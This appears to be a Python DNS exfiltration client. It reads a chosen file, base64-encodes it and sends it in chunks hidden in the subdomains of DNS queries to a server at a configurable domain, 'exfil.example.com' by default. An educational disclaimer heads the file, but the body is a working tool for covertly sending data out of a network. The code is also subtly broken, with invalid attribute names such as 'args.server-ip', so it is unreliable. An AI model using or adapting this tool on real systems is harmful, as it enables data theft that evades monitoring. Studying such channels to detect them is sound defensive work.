#!/usr/bin/env python3
"""
Module Name: client.py

Description: This module is an example implementation of a DNS exfiltration client.
I created this client to better understand DNS exfiltration techniques and to test the server implementation.
The client reads the contents of a file and encodes it in base64.
The encoded data is then split into chunks and sent to the server using DNS queries.
The subdomain of the query contains a unique identifier, the sequence number of the chunk, the total number of chunks, and the chunk data.
The client uses the dnslib library to send DNS queries to the server.

Disclaimer: The DNS Exfiltration Tool is developed for educational and research purposes only. 
It is intended to help users learn about and study DNS exfiltration techniques in a controlled, responsible, and legal environment.

This tool should not be used on any network, system, or domain without explicit permission from the rightful owners or administrators. 
Unauthorized use of this tool to perform DNS exfiltration or any other form of unauthorized data extraction could violate local, state, national, and international laws.

By downloading, copying, installing, or using the software, you agree to use it in a manner consistent with your local laws. 
The authors of this software disclaim all liability for any illegal use of this tool and any damages that may occur from its use. 
It is your responsibility to comply with all applicable laws and to use the software ethically and responsibly.

Author: John Burns
Date: 2024-04-30
Version: 1.0
"""

import sys
import base64
from uuid import uuid4
import socket
from dnslib import DNSRecord, DNSQuestion, QTYPE
import argparse


def encode_file_contents(file_path):
    """Read the contents of a file and encode it in base64."""
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encoded_data = base64.urlsafe_b64encode(file_data).decode('ascii')
    return encoded_data.replace('+', '-').replace('/', '_')


def chunk_data(data, size):
    """Yield successive size chunks from data."""
    for i in range(0, len(data), size):
        yield data[i:i + size]


def send_dns_query(subdomain, args):
    """Send DNS queries to a specified server using dnslib."""
    query = DNSRecord(q=DNSQuestion(f"{subdomain}.{args.domain}", QTYPE.A))
    query_data = query.pack()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.settimeout(2)
        sock.sendto(query_data, (args.server-ip, args.server-port))
        response, _ = sock.recvfrom(1024)
        print("Received response:", DNSRecord.parse(response))
    except socket.timeout:
        print("No response received.")
    finally:
        sock.close()


def main(args):
    identifier = str(uuid4()).replace('-', '')[:8]  # Unique identifier
    encoded_data = encode_file_contents(args.file-path)
    # Adjusted for additional '-' and sequence numbers
    # print(len(domain))
    max_length = 63 - len(identifier) - 16 - 3
    # print(max_length)
    # raise SystemExit
    segments = list(chunk_data(encoded_data, max_length))
    total_segments = len(segments)
    # print(f"Total segments: {total_segments}")

    for i, chunk in enumerate(segments):
        subdomain = f"{identifier}-{i}-{total_segments}-{chunk}"
        if len(subdomain) > 63:
            print(f"Warning: Subdomain length exceeds 63 characters: {
                  len(subdomain)} characters: {subdomain}")
        send_dns_query(subdomain, args)


def get_args():
    parser = argparse.ArgumentParser(description="DNS Exfiltration Server")
    parser.add_argument("--server-port", type=int, default=5300,
                        help="The port on which the server listens")
    parser.add_argument("--server-ip", type=str, default="127.0.0.1",
                        help="The IP address of the server")
    parser.add_argument("--file-path", default="output",
                        help="File to exfiltrate via DNS")
    parser.add_argument("--domain", type=str, default="exfil.example.com",
                        help="The domain to query")
    return parser.parse_args()


if __name__ == "__main__":
    args = get_args()
    main(args)
